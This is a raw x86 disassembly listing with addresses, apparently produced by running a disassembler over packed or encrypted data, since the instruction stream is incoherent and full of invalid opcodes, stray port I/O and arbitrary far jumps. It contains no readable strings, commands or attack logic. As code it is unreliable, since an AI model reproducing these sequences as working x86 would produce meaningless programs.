  42da99:	lds    esp,FWORD PTR [edi-0x3a]
  42da9c:	mov    esp,0x9f915edf
  42daa1:	xchg   BYTE PTR [ebx+0x58],ah
  42daa4:	xor    eax,0xbb298ef7
  42daa9:	and    esp,DWORD PTR [ebx]
  42daab:	sahf   
  42daac:	mov    ebp,edi
  42daae:	call   DWORD PTR [ebx-0x62b07198]
  42dab4:	dec    esp
  42dab5:	js     0x42daa8
  42dab7:	fisubr DWORD PTR [ecx+0x16]
  42daba:	scas   al,BYTE PTR es:[edi]
  42dabb:	mov    edi,0x31b9578
  42dac0:	mov    ah,0xce
  42dac2:	pop    edi
  42dac3:	cmp    BYTE PTR [esi+0x1a637cf0],cl
  42dac9:	imul   esp
  42dacb:	push   cs
  42dacc:	jae    0x42db25
  42dace:	jmp    0x42da7c
  42dad0:	push   cs
  42dad1:	push   ds
  42dad2:	adc    BYTE PTR [esi-0x6e],al
  42dad5:	adc    DWORD PTR [edx],0x3caaeda5
  42dadb:	das    
  42dadc:	clc    
  42dadd:	out    dx,eax
  42dade:	imul   edx,DWORD PTR [edi+0x79],0xc4f47dca
  42dae5:	int3   
  42dae6:	call   0x82e8:0xe7c244c6
  42daed:	jge    0x42db20
  42daef:	pop    eax
  42daf0:	adc    ch,BYTE PTR [ebx+edx*4]
  42daf3:	mov    ds:0xa5578cf9,eax
  42daf8:	inc    esp
  42daf9:	sbb    DWORD PTR [esi],ebp
  42dafb:	sti    
  42dafc:	mov    al,ds:0x8db85e6b
  42db01:	xor    eax,0x61ade9b1
  42db06:	or     esi,ebx
  42db08:	pop    esp
  42db09:	xor    dh,BYTE PTR [edx+0x14]
  42db0c:	int    0xf3
  42db0e:	outs   dx,BYTE PTR ds:[esi]
  42db0f:	pushf  
  42db10:	sldt   WORD PTR [eax]
	...
  42db73:	add    BYTE PTR [eax-0x2093e086],dh
  42db79:	ins    DWORD PTR es:[edi],dx
  42db7a:	repz (bad) 
  42db7c:	fwait
  42db7d:	jns    0x42db1a
  42db7f:	jns    0x42dbb2
  42db81:	dec    esi
  42db82:	push   eax
  42db83:	adc    eax,0x1ea3b
  42db88:	add    eax,0xb9000001
  42db8d:	ins    BYTE PTR es:[edi],dx
  42db8e:	rep ins DWORD PTR es:[edi],dx
  42db90:	in     eax,0xac
  42db92:	dec    esp
  42db93:	fwait
  42db94:	xor    eax,0x13e6472d
  42db99:	jge    0x42dbdc
  42db9b:	cmp    si,WORD PTR [eax-0x1e]
  42db9f:	pop    eax
  42dba0:	fisttp WORD PTR [ebp+0x177e8a5a]
  42dba6:	data16 and bl,BYTE PTR [edi]
  42dba9:	cdq    
  42dbaa:	pop    ss
  42dbab:	shl    BYTE PTR [eax-0x3f],1
  42dbae:	xchg   edx,eax
  42dbaf:	sbb    BYTE PTR [ecx+eiz*4],ch
  42dbb2:	imul   ebx,ecx,0x3c55fa51
  42dbb8:	dec    edi
  42dbb9:	and    esp,DWORD PTR [edi]
  42dbbb:	repnz pop eax
  42dbbd:	pop    ss
  42dbbe:	leave  
  42dbbf:	retf   
  42dbc0:	je     0x42dbb4
  42dbc2:	out    dx,eax
  42dbc3:	sub    edx,edx
  42dbc5:	or     eax,0x9cde0154
  42dbca:	push   esp
  42dbcb:	rcr    cl,0x73
  42dbce:	pop    ebp
  42dbcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dbd0:	aaa    
  42dbd1:	scas   eax,DWORD PTR es:[edi]
  42dbd2:	sub    edi,DWORD PTR [ebp-0x7]
  42dbd5:	retf   0xeccb
  42dbd8:	adc    ebp,esi
  42dbda:	stos   DWORD PTR es:[edi],eax
  42dbdb:	aas    
  42dbdc:	pop    esp
  42dbdd:	inc    eax
  42dbde:	jg     0x42dc5f
  42dbe0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dbe1:	or     eax,0x6bcc00b7
  42dbe6:	pusha  
  42dbe7:	cmp    DWORD PTR [ecx+0x7eded8f],0xd4d3d64c
  42dbf1:	push   eax
  42dbf2:	jle    0x42dbf3
  42dbf4:	xchg   BYTE PTR [edi-0x62],bl
  42dbf7:	pop    ebx
  42dbf8:	js     0x42dc77
  42dbfa:	out    dx,al
  42dbfb:	sbb    eax,DWORD PTR [esi]
  42dbfd:	sbb    ebx,esp
  42dbff:	dec    ebx
  42dc00:	cdq    
  42dc01:	loop   0x42dc25
  42dc03:	in     al,dx
  42dc04:	pop    esp
  42dc05:	rcl    DWORD PTR [edi-0x5b],0x7c
  42dc09:	not    bh
  42dc0b:	daa    
  42dc0c:	ret    0x23f1
  42dc0f:	jo     0x42dba7
  42dc11:	scas   al,BYTE PTR es:[edi]
  42dc12:	sar    ebx,0xc3
  42dc15:	sub    al,0xe2
  42dc17:	jmp    0x7f3b:0x35c982c
  42dc1e:	cld    
  42dc1f:	sbb    eax,0x4345b0c
  42dc24:	xchg   edi,eax
  42dc25:	mov    ecx,0xd525fe26
  42dc2a:	imul   edx,DWORD PTR [ebx+0x19],0xc3f69925
  42dc31:	fiadd  DWORD PTR [eax+0x13]
  42dc34:	rol    BYTE PTR [edi],cl
  42dc36:	(bad)  
  42dc38:	ins    BYTE PTR es:[edi],dx
  42dc39:	es push ss
  42dc3b:	ja     0x42dbbf
  42dc3d:	es sahf 
  42dc3f:	adc    ah,BYTE PTR [ecx-0x34949d42]
  42dc45:	or     al,0x4c
  42dc47:	in     al,dx
  42dc48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dc49:	push   es
  42dc4a:	xchg   ebp,eax
  42dc4b:	sub    BYTE PTR [edi],0x1f
  42dc4e:	adc    eax,0x43fc8292
  42dc53:	int3   
  42dc54:	push   edi
  42dc55:	cmp    DWORD PTR ds:0xce4df9d6,ebp
  42dc5b:	and    DWORD PTR [esi+0x63bf2fe2],esp
  42dc61:	xor    DWORD PTR [edi-0x6d],eax
  42dc64:	loopne 0x42dc81
  42dc66:	xchg   ebx,eax
  42dc67:	stc    
  42dc68:	fnstenv [esi-0x3f]
  42dc6b:	lods   eax,DWORD PTR ds:[esi]
  42dc6c:	mov    bh,0x7b
  42dc6e:	add    bl,BYTE PTR [ebp+0x599e8472]
  42dc74:	aad    0x15
  42dc76:	cs leave 
  42dc78:	pushf  
  42dc79:	test   DWORD PTR [ebx+eax*1],0x37eecf45
  42dc80:	xchg   ebx,eax
  42dc81:	xchg   DWORD PTR [eax],esi
  42dc83:	push   edi
  42dc84:	push   eax
  42dc85:	pop    ds
  42dc86:	call   0xa247:0xc46d71cb
  42dc8d:	dec    esp
  42dc8e:	inc    bx
	...
  42dcf4:	cmp    DWORD PTR [edi-0x2010f093],esi
  42dcfa:	jnp    0x42dcb3
  42dcfc:	adc    BYTE PTR [eax],ch
  42dcfe:	jne    0x42dce6
  42dd00:	in     eax,dx
  42dd01:	pop    ebp
  42dd02:	test   BYTE PTR [edx+0x1eb40],dl
  42dd08:	add    eax,0x28000001
  42dd0d:	xor    cl,ah
  42dd0f:	cmp    BYTE PTR [ebx-0xcf1978a],0x78
  42dd16:	pop    ds
  42dd17:	stos   BYTE PTR es:[edi],al
  42dd18:	fwait
  42dd19:	sti    
  42dd1a:	pusha  
  42dd1b:	fcomp  QWORD PTR [ebp+eax*2-0x64e500e9]
  42dd22:	(bad)  
  42dd23:	fidiv  DWORD PTR [esp+esi*2-0x2ba69ab2]
  42dd2a:	(bad)  
  42dd2b:	or     ah,BYTE PTR ss:[ebp-0x26]
  42dd2f:	test   al,0x11
  42dd31:	js     0x42dcbe
  42dd33:	mov    esp,0xbce8d648
  42dd38:	sub    DWORD PTR [ebp+0x19],ebx
  42dd3b:	stc    
  42dd3c:	test   DWORD PTR [esi+eiz*2+0x70aced56],eax
  42dd43:	retf   0xf05f
  42dd46:	je     0x42dd33
  42dd48:	mov    ebp,0xc30cdcee
  42dd4d:	sbb    eax,0x4a90e195
  42dd52:	stos   DWORD PTR es:[edi],eax
  42dd53:	xor    BYTE PTR [edx],bh
  42dd55:	imul   eax,esi,0xcc775fdd
  42dd5b:	add    al,0xd8
  42dd5d:	pop    eax
  42dd5e:	leave  
  42dd5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dd60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dd61:	or     al,0x56
  42dd63:	mov    bl,0x16
  42dd65:	dec    eax
  42dd66:	loopne 0x42ddca
  42dd68:	fsubr  QWORD PTR [ebx+0x7c]
  42dd6b:	cmp    eax,0xfb9cfacd
  42dd70:	xchg   BYTE PTR [eax],al
  42dd72:	sbb    esp,DWORD PTR [ebp-0x15]
  42dd75:	or     BYTE PTR [eax+ebp*1+0x100fd082],0xe7
  42dd7d:	xlat   BYTE PTR ds:[ebx]
  42dd7e:	fild   DWORD PTR [esi+0x519cc080]
  42dd84:	add    eax,0x75bd911f
  42dd89:	mul    dh
  42dd8b:	in     al,0x65
  42dd8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dd8e:	jl     0x42ddc0
  42dd90:	lock mov eax,0x50836cd8
  42dd96:	jnp    0x42dda1
  42dd98:	mov    ds:0x360f2438,al
  42dd9d:	iret   
  42dd9e:	stc    
  42dd9f:	sub    eax,0x2b13ea3a
  42dda4:	cli    
  42dda5:	push   cs
  42dda6:	popw   ss
  42dda8:	aas    
  42dda9:	jns    0x42ddde
  42ddab:	jecxz  0x42dd4a
  42ddad:	push   es
  42ddae:	xor    esp,DWORD PTR [ebp+0x7a]
  42ddb1:	xchg   esi,eax
  42ddb2:	fdivr  DWORD PTR [ebp-0xdee8c3f]
  42ddb8:	jmp    0xb83988b5
  42ddbd:	fwait
  42ddbe:	mov    edx,0xab16197
  42ddc3:	adc    DWORD PTR [ecx+0x5e3f49ea],esi
  42ddc9:	loope  0x42dd4e
  42ddcb:	pop    eax
  42ddcc:	mov    esp,0x3a2e9dd1
  42ddd1:	or     eax,0x18c897ef
  42ddd6:	pop    esi
  42ddd7:	imul   ebx,DWORD PTR [edi],0xffffffff
  42ddda:	xlat   BYTE PTR ds:[ebx]
  42dddb:	mov    esp,DWORD PTR [ebp+0x4b]
  42ddde:	imul   ebx,DWORD PTR [eax+0x1fe581a4],0x1f
  42dde5:	or     al,0xaf
  42dde7:	ja     0x42dd98
  42dde9:	les    ebp,FWORD PTR [ebx-0x3dce5de]
  42ddef:	mov    bl,0x17
  42ddf1:	aaa    
  42ddf2:	dec    BYTE PTR [ebp+0x6464c505]
  42ddf8:	mov    ch,0x7
  42ddfa:	adc    eax,0xadb1bbeb
  42ddff:	bound  esi,QWORD PTR [eax+ecx*1+0x4c]
  42de03:	pusha  
  42de04:	mov    ebx,0x28e43307
  42de09:	xchg   ecx,eax
  42de0a:	push   0x43
  42de0c:	fld1   
  42de0e:	inc    eax
  42de0f:	sbb    edx,DWORD PTR [edi]
	...
  42de71:	add    BYTE PTR [eax],al
  42de73:	add    dh,ah
  42de75:	sub    BYTE PTR [ebp-0x1c012cd],0xd7
  42de7c:	fist   DWORD PTR [ebp-0x79]
  42de7f:	das    
  42de80:	in     eax,dx
  42de81:	out    dx,al
  42de82:	fs jb  0x42deca
  42de85:	in     al,dx
  42de86:	add    DWORD PTR [eax],eax
  42de88:	add    eax,0xa3000001
  42de8d:	imul   ebp,DWORD PTR [ebx-0x6b],0xffffff9e
  42de91:	adc    al,0x98
  42de93:	test   BYTE PTR [ebx+0x3d711a68],dl
  42de99:	mov    edi,0x4eaae4fb
  42de9e:	outs   dx,DWORD PTR ds:[esi]
  42de9f:	test   eax,0x3a9dec38
  42dea4:	xor    eax,DWORD PTR [edi]
  42dea6:	(bad)  
  42dea7:	mov    ebx,0x2149aa3a
  42deac:	fwait
  42dead:	add    ecx,esp
  42deaf:	sub    DWORD PTR [esi],ebp
  42deb1:	cwde   
  42deb2:	mov    edx,0x81c16fcd
  42deb7:	popf   
  42deb8:	xor    BYTE PTR [edi+ebp*2-0x12989e59],ch
  42debf:	jns    0x42df24
  42dec1:	mov    edx,0x301c1eb8
  42dec6:	jb     0x42df12
  42dec8:	jmp    0x45ff:0x729d15db
  42decf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ded0:	int    0xe3
  42ded2:	sbb    al,0xe2
  42ded4:	scas   eax,DWORD PTR es:[edi]
  42ded5:	mov    dh,0xcd
  42ded7:	adc    BYTE PTR [edi-0x68],bl
  42deda:	scas   al,BYTE PTR es:[edi]
  42dedb:	cmp    edx,esi
  42dedd:	scas   al,BYTE PTR es:[edi]
  42dede:	push   0xffffff9c
  42dee0:	xchg   ecx,eax
  42dee1:	xor    eax,0x2dcef2a5
  42dee6:	xchg   edx,eax
  42dee7:	jbe    0x42df1b
  42dee9:	daa    
  42deea:	push   ds
  42deeb:	or     DWORD PTR [ecx-0xa],esi
  42deee:	test   BYTE PTR [edx+0x7c5981d],bl
  42def4:	add    DWORD PTR [edi],esi
  42def6:	sti    
  42def7:	mov    ?,edx
  42def9:	addr16 add ah,0x13
  42defd:	push   eax
  42defe:	dec    esi
  42deff:	mov    dh,0xa0
  42df01:	les    dx,DWORD PTR [eax-0x497bf253]
  42df08:	loopne 0x42df1a
  42df0a:	pop    ds
  42df0b:	mov    esp,0x89ba49b3
  42df10:	fwait
  42df11:	mov    al,0x36
  42df13:	cmc    
  42df14:	mov    al,ds:0xe3778887
  42df19:	out    dx,eax
  42df1a:	cmp    eax,0x872f760f
  42df1f:	jnp    0x42df79
  42df21:	ins    DWORD PTR es:[edi],dx
  42df22:	jae    0x42ded6
  42df24:	sub    DWORD PTR [edx-0x7281290a],esi
  42df2a:	jl     0x42deb5
  42df2c:	es jno 0x42df33
  42df2f:	pop    esp
  42df30:	pop    ds
  42df31:	in     eax,0x8c
  42df33:	pushf  
  42df34:	and    eax,0xe4ccd0da
  42df39:	jge    0x42df6d
  42df3b:	dec    esp
  42df3c:	or     BYTE PTR [edx-0xb29dd0f],al
  42df42:	popf   
  42df43:	je     0x42df8d
  42df45:	cmp    bh,BYTE PTR [ecx]
  42df47:	inc    ebp
  42df48:	aam    0x10
  42df4a:	repnz aaa 
  42df4c:	xchg   esp,eax
  42df4d:	stos   BYTE PTR es:[edi],al
  42df4e:	inc    esi
  42df4f:	mov    edx,0x2d6ec149
  42df54:	sbb    cl,BYTE PTR [ecx-0x21c9bceb]
  42df5a:	or     eax,0x1d437b16
  42df5f:	sti    
  42df60:	and    edx,DWORD PTR [ebp+0x39]
  42df63:	cmp    eax,DWORD PTR [ebp+0x10]
  42df66:	leave  
  42df67:	(bad)  
  42df68:	mov    ch,0x2f
  42df6a:	cs das 
  42df6c:	aad    0x4a
  42df6e:	aam    0xb8
  42df70:	in     al,0x73
  42df72:	repnz push 0x6c6f0869
  42df78:	fdiv   DWORD PTR [esi-0x69b4a552]
  42df7e:	mov    ?,WORD PTR [eax]
  42df80:	xchg   edi,eax
  42df81:	mov    al,ds:0x84515ce2
  42df86:	leave  
  42df87:	rol    DWORD PTR [edx-0x50],1
  42df8a:	cmc    
  42df8b:	scas   eax,DWORD PTR es:[edi]
  42df8c:	sub    al,BYTE PTR [edx-0x28]
  42df8f:	or     DWORD PTR [edx+0x0],ebp
	...
  42dff1:	add    BYTE PTR [eax],al
  42dff3:	add    BYTE PTR [edx],al
  42dff5:	(bad)  
  42dff6:	jb     0x42df9e
  42dff8:	(bad)  
  42dff9:	scas   al,BYTE PTR es:[edi]
  42dffa:	(bad)  
  42dffb:	dec    BYTE PTR [edi-0x30]
  42dffe:	fisttp WORD PTR [esi+0x24]
  42e001:	or     ebp,DWORD PTR [ebp+edi*2+0x4a]
  42e005:	in     eax,dx
  42e006:	add    DWORD PTR [eax],eax
  42e008:	add    eax,0xe000001
  42e00d:	mov    eax,0x1162cd09
  42e012:	push   ecx
  42e013:	js     0x42e069
  42e015:	sti    
  42e016:	adc    DWORD PTR [ebp-0x9],ebp
  42e019:	push   0xffffff95
  42e01b:	adc    BYTE PTR [esi],bl
  42e01d:	lock mov al,0xd6
  42e020:	ss inc esp
  42e022:	adc    al,BYTE PTR [ebx+0x77e9594c]
  42e028:	andps  xmm1,xmm7
  42e02b:	or     eax,0xb308f748
  42e030:	icebp  
  42e031:	mov    bl,BYTE PTR [ebp+0x14]
  42e034:	pop    esp
  42e035:	sbb    bh,BYTE PTR [ebx+esi*2+0x2940489b]
  42e03c:	mov    eax,0x71872f17
  42e041:	repnz pop ds
  42e043:	cmp    BYTE PTR [edx],bh
  42e045:	mov    al,0xf3
  42e047:	adc    al,0x4c
  42e049:	xor    DWORD PTR ds:[ecx+0x7574d3a3],ecx
  42e050:	xchg   edi,eax
  42e051:	sub    al,0x52
  42e053:	adc    eax,0xf51ba776
  42e058:	sbb    bh,ah
  42e05a:	cmp    eax,DWORD PTR [edx+0x1a]
  42e05d:	lock scas al,BYTE PTR es:[edi]
  42e05f:	ins    DWORD PTR es:[edi],dx
  42e060:	leave  
  42e061:	loopne 0x42e01b
  42e063:	xlat   BYTE PTR ds:[ebx]
  42e064:	hlt    
  42e065:	call   0xc41d:0x84159530
  42e06c:	push   edx
  42e06d:	cdq    
  42e06e:	jmp    0x61dd3c8d
  42e073:	aas    
  42e074:	das    
  42e075:	mov    esi,DWORD PTR [ebp-0x7bc2b3e0]
  42e07b:	mov    al,0xc2
  42e07d:	icebp  
  42e07e:	cmp    dl,BYTE PTR [ecx]
  42e080:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e081:	ror    BYTE PTR [bp-0x5f],cl
  42e085:	out    dx,al
  42e086:	fs push es
  42e088:	xchg   ebx,eax
  42e089:	arpl   WORD PTR gs:[esi],ax
  42e08c:	jns    0x42e098
  42e08e:	inc    edx
  42e08f:	inc    ecx
  42e090:	rol    DWORD PTR ds:0xadd46263,cl
  42e096:	(bad)  
  42e097:	pop    eax
  42e098:	mov    eax,0x11830f8a
  42e09d:	mov    edi,0xf4193cff
  42e0a2:	fnstenv [edi+0x23ee27eb]
  42e0a8:	pop    ebp
  42e0a9:	je     0x42e088
  42e0ab:	dec    esp
  42e0ac:	xchg   edx,eax
  42e0ad:	and    ebp,DWORD PTR [ebp+edx*8-0x59]
  42e0b1:	pop    edi
  42e0b2:	jno    0x42e12a
  42e0b4:	clc    
  42e0b5:	dec    eax
  42e0b6:	lahf   
  42e0b7:	mov    cl,0xdc
  42e0b9:	jecxz  0x42e12c
  42e0bb:	push   ss
  42e0bc:	xlat   BYTE PTR ds:[ebx]
  42e0bd:	loope  0x42e042
  42e0bf:	xchg   edx,eax
  42e0c0:	cmp    DWORD PTR [eax+0x5bfa13e9],edx
  42e0c6:	pop    esi
  42e0c7:	jl     0x42e07c
  42e0c9:	jmp    0xd7cf80d6
  42e0ce:	addr16 addr16 sub eax,0xfa77012d
  42e0d5:	push   ds
  42e0d6:	clc    
  42e0d7:	je     0x42e0d8
  42e0d9:	fimul  DWORD PTR [eax+0x60]
  42e0dc:	sbb    esi,ebp
  42e0de:	adc    eax,0x448f6fc3
  42e0e3:	loope  0x42e069
  42e0e5:	sub    ebp,DWORD PTR ds:0x368560c2
  42e0eb:	in     eax,dx
  42e0ec:	mov    DWORD PTR [edi],eax
  42e0ee:	mov    esi,0x9fb6f3fa
  42e0f3:	xchg   esi,eax
  42e0f4:	dec    edi
  42e0f5:	out    0xf8,al
  42e0f7:	mov    edx,DWORD PTR [eax]
  42e0f9:	xor    BYTE PTR [esi-0xed56b9f],cl
  42e0ff:	pop    esi
  42e100:	in     al,0x7a
  42e102:	pushf  
  42e103:	imul   edi,DWORD PTR [esp+eiz*8-0x1a215caf],0x1cd44c26
  42e10e:	rol    DWORD PTR [ecx+0x43],1
	...
  42e171:	add    BYTE PTR [eax],al
  42e173:	add    BYTE PTR [ecx+0x7e061ecf],ah
  42e179:	xlat   BYTE PTR ds:[ebx]
  42e17a:	mov    ecx,0x35bb80ef
  42e17f:	xchg   edi,eax
  42e180:	and    al,0xe1
  42e182:	adc    eax,0x1ee4f14
  42e187:	add    BYTE PTR ds:0x1,al
  42e18d:	js     0x42e12d
  42e18f:	(bad)  
  42e191:	inc    ebx
  42e192:	je     0x42e158
  42e194:	inc    eax
  42e195:	xor    cl,dl
  42e197:	mov    cl,0x74
  42e199:	cld    
  42e19a:	xchg   esp,eax
  42e19b:	mov    al,ds:0x96daf1ee
  42e1a0:	push   ecx
  42e1a1:	or     esi,ebx
  42e1a3:	pop    ss
  42e1a4:	push   ebx
  42e1a5:	mov    ah,0x3d
  42e1a7:	and    DWORD PTR [ebp-0x305e881d],ecx
  42e1ad:	leave  
  42e1ae:	or     dl,BYTE PTR [ebp-0x58e76fa]
  42e1b4:	fnsave [edx]
  42e1b6:	push   es
  42e1b7:	mov    bh,0x7b
  42e1b9:	mov    dh,0x15
  42e1bb:	cmp    BYTE PTR [ecx-0x27],0x31
  42e1bf:	adc    DWORD PTR [esi],edx
  42e1c1:	packssdw mm0,QWORD PTR [ebx+edi*2-0xb]
  42e1c6:	cmp    esp,edx
  42e1c8:	dec    ecx
  42e1c9:	in     al,0x27
  42e1cb:	cmp    bh,BYTE PTR [edx-0x11e657e5]
  42e1d1:	cwde   
  42e1d2:	fs pop esp
  42e1d4:	jne    0x42e19c
  42e1d6:	shl    bl,cl
  42e1d8:	and    al,0xd7
  42e1da:	dec    ebx
  42e1db:	test   al,0xb0
  42e1dd:	mov    ah,0x87
  42e1df:	push   es
  42e1e0:	data16 in al,0x6b
  42e1e3:	push   edx
  42e1e4:	mov    al,0xb5
  42e1e6:	mov    bl,0x29
  42e1e8:	xor    BYTE PTR [edx-0x11],0xb5
  42e1ec:	nop
  42e1ed:	mov    dh,0x32
  42e1ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e1f0:	inc    edi
  42e1f1:	repnz mov esp,0xc354fa52
  42e1f7:	retf   
  42e1f8:	rcl    BYTE PTR [eax-0x62],0x5
  42e1fc:	repz mov ebx,0x68ba7218
  42e202:	loopne 0x42e199
  42e204:	adc    BYTE PTR [edi-0x41bdaf3d],cl
  42e20a:	aaa    
  42e20b:	clc    
  42e20c:	jg     0x42e215
  42e20e:	je     0x42e1a3
  42e210:	adc    dh,ah
  42e212:	rcl    BYTE PTR [edi-0x6a],1
  42e215:	nop
  42e216:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e217:	mov    dh,0x42
  42e219:	cmp    bl,BYTE PTR [esi+eiz*1]
  42e21c:	or     BYTE PTR [ecx-0x12],cl
  42e21f:	lahf   
  42e220:	jno    0x42e21b
  42e222:	adc    dl,dl
  42e224:	dec    ebp
  42e225:	and    bl,dh
  42e227:	clc    
  42e228:	retf   
  42e229:	sub    eax,0xc41a418
  42e22e:	jmp    0xb87d789
  42e233:	push   cs
  42e234:	mov    esi,0xb491d26b
  42e239:	ss inc ecx
  42e23b:	jecxz  0x42e1fd
  42e23d:	jmp    0x3c04:0xa4c87175
  42e244:	out    0x2e,al
  42e246:	imul   esp,DWORD PTR [ecx],0xffffffbc
  42e249:	rol    edi,cl
  42e24b:	es test DWORD PTR ss:[eax],ebp
  42e24f:	jge    0x42e24e
  42e251:	test   BYTE PTR [edi+eiz*8+0x4c],dl
  42e255:	jb     0x42e2b4
  42e257:	stos   BYTE PTR es:[edi],al
  42e258:	push   ecx
  42e259:	jmp    0x42e214
  42e25b:	repz in al,dx
  42e25d:	sbb    dl,BYTE PTR [esi]
  42e25f:	xor    eax,0x7370d3eb
  42e264:	loop   0x42e29d
  42e266:	jns    0x42e280
  42e268:	or     DWORD PTR [edx-0x286e320a],esp
  42e26e:	push   ds
  42e26f:	pusha  
  42e270:	popa   
  42e271:	jns    0x42e1f6
  42e273:	mov    ds:0x46912dd,eax
  42e278:	xchg   esp,eax
  42e279:	and    eax,0x835ce106
  42e27e:	lea    edi,es:[esi+0x44eea14a]
  42e285:	sub    ah,BYTE PTR [edx+0x4c]
  42e288:	jecxz  0x42e266
  42e28a:	les    esp,FWORD PTR [esi-0x5f483d31]
  42e290:	add    eax,0x0
	...
  42e2f1:	add    BYTE PTR [eax],al
  42e2f3:	add    BYTE PTR [ebp-0x655875c3],ch
  42e2f9:	mov    bh,0xad
  42e2fb:	aas    
  42e2fc:	mov    ebx,0x95199140
  42e301:	pop    ebp
  42e302:	es mov ecx,0x1ef54
  42e308:	add    eax,0xa3000001
  42e30d:	mov    ch,BYTE PTR [ebx-0x58]
  42e310:	mov    bl,0x32
  42e312:	mov    cl,0xac
  42e314:	mov    BYTE PTR [ebp+0x4a],cl
  42e317:	lds    eax,FWORD PTR [ebx+0x7366d614]
  42e31d:	(bad)  
  42e31e:	fsubr  st,st(2)
  42e320:	imul   ebp,DWORD PTR [edx],0xffffffa2
  42e323:	push   esi
  42e324:	pop    edi
  42e325:	js     0x42e38a
  42e327:	gs jns 0x42e2df
  42e32a:	in     eax,dx
  42e32b:	inc    edi
  42e32c:	pop    ss
  42e32d:	(bad)  
  42e32e:	retf   
  42e32f:	mov    dh,BYTE PTR ss:[edi+edi*2+0x9f29845]
  42e337:	(bad)  
  42e338:	dec    esi
  42e339:	out    dx,eax
  42e33a:	push   ss
  42e33b:	outs   dx,DWORD PTR ds:[esi]
  42e33c:	mov    al,0x8f
  42e33e:	mov    al,0x78
  42e340:	xchg   ebp,eax
  42e341:	sub    bl,0x63
  42e344:	ret    
  42e345:	pop    eax
  42e346:	push   ebx
  42e347:	jg     0x42e2d3
  42e349:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e34a:	sub    esi,DWORD PTR [esi-0x8]
  42e34d:	jno    0x42e351
  42e34f:	inc    eax
  42e350:	out    dx,eax
  42e351:	xchg   ecx,eax
  42e352:	jg     0x42e3ac
  42e354:	cld    
  42e355:	push   0xffffffc2
  42e357:	not    BYTE PTR [edi]
  42e359:	int    0x44
  42e35b:	in     eax,dx
  42e35c:	in     al,0x2d
  42e35e:	jo     0x42e372
  42e360:	jns    0x42e339
  42e362:	cli    
  42e363:	dec    eax
  42e364:	sar    DWORD PTR [ebp+ebp*2-0x6ae9d06],1
  42e36b:	sahf   
  42e36c:	nop
  42e36d:	inc    ebx
  42e36e:	aas    
  42e36f:	dec    ebp
  42e370:	imul   BYTE PTR [esi]
  42e372:	scas   al,BYTE PTR es:[edi]
  42e373:	arpl   WORD PTR [ebp-0x72],di
  42e376:	(bad)  
  42e377:	ja     0x42e30e
  42e379:	and    eax,0x3afd8290
  42e37e:	xchg   edx,eax
  42e37f:	add    bh,BYTE PTR [ebx-0x2]
  42e382:	in     al,dx
  42e383:	push   ebp
  42e384:	jae    0x42e3b1
  42e386:	test   DWORD PTR [eax+0x1750dff0],edi
  42e38c:	or     eax,0x6ce39e25
  42e391:	jnp    0x42e37e
  42e393:	retf   0x5a62
  42e396:	dec    edi
  42e397:	(bad)  [edx+esi*8+0x4c]
  42e39b:	or     al,0xe0
  42e39d:	cwde   
  42e39e:	sub    DWORD PTR [edi+ecx*4+0x49226877],0x6f
  42e3a6:	pop    cx
  42e3a8:	lahf   
  42e3a9:	scas   al,BYTE PTR es:[edi]
  42e3aa:	aaa    
  42e3ab:	cli    
  42e3ac:	mov    al,dl
  42e3ae:	iret   
  42e3af:	arpl   WORD PTR [ebp+0x1f],si
  42e3b2:	scas   al,BYTE PTR es:[edi]
  42e3b3:	sbb    al,0xec
  42e3b5:	cwde   
  42e3b6:	cmp    eax,0x5d75e16c
  42e3bb:	test   eax,0xb1da042e
  42e3c0:	iret   
  42e3c1:	fist   DWORD PTR [edx+0x1541dc00]
  42e3c7:	lods   eax,DWORD PTR ds:[esi]
  42e3c8:	repnz add esp,DWORD PTR [ebp-0x19]
  42e3cc:	(bad)  
  42e3cd:	dec    ebx
  42e3ce:	sub    BYTE PTR [eax-0x60],bl
  42e3d1:	fmulp  st(0),st
  42e3d3:	dec    esp
  42e3d4:	cwde   
  42e3d5:	mov    bh,0x6e
  42e3d7:	push   es
  42e3d8:	push   ebp
  42e3d9:	push   ds
  42e3da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e3db:	faddp  st(0),st
  42e3dd:	aaa    
  42e3de:	and    eax,DWORD PTR [ebx-0x42]
  42e3e1:	cmp    al,0x1b
  42e3e3:	jbe    0x42e3f5
  42e3e5:	mov    ds:0x39de4186,eax
  42e3ea:	ja     0x42e3ac
  42e3ec:	fdiv   DWORD PTR [esi-0x1ead9eec]
  42e3f2:	div    BYTE PTR gs:[edi-0x79]
  42e3f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e3f7:	jae    0x42e445
  42e3f9:	(bad)  
  42e3fa:	out    0xd,eax
  42e3fc:	pop    edx
  42e3fd:	mov    esp,0x81f31b5f
  42e402:	pop    ds
  42e403:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e404:	retf   0x7bd7
  42e407:	xchg   ebp,eax
  42e408:	outs   dx,DWORD PTR ds:[esi]
  42e409:	out    dx,eax
  42e40a:	popf   
  42e40b:	(bad)
  42e40e:	cli    
  42e40f:	in     al,0x74
	...
  42e471:	add    BYTE PTR [eax],al
  42e473:	add    dl,ah
  42e475:	mov    ebp,0xe7dfc7dc
  42e47a:	sti    
  42e47b:	mov    ebp,0xe093f290
  42e480:	lods   eax,DWORD PTR ds:[esi]
  42e481:	shl    BYTE PTR [ebp+0x1f059a9],0x0
  42e488:	add    eax,0xd4000001
  42e48d:	icebp  
  42e48e:	mov    ebx,0xb40f6a3
  42e493:	jnp    0x42e4f8
  42e495:	out    dx,eax
  42e496:	pop    esi
  42e497:	ss inc ebx
  42e499:	out    dx,al
  42e49a:	pop    ds
  42e49b:	aad    0x6b
  42e49d:	in     eax,dx
  42e49e:	inc    BYTE PTR ds:0xb9c17a6b
  42e4a4:	js     0x42e431
  42e4a6:	loop   0x42e523
  42e4a8:	add    al,0x6b
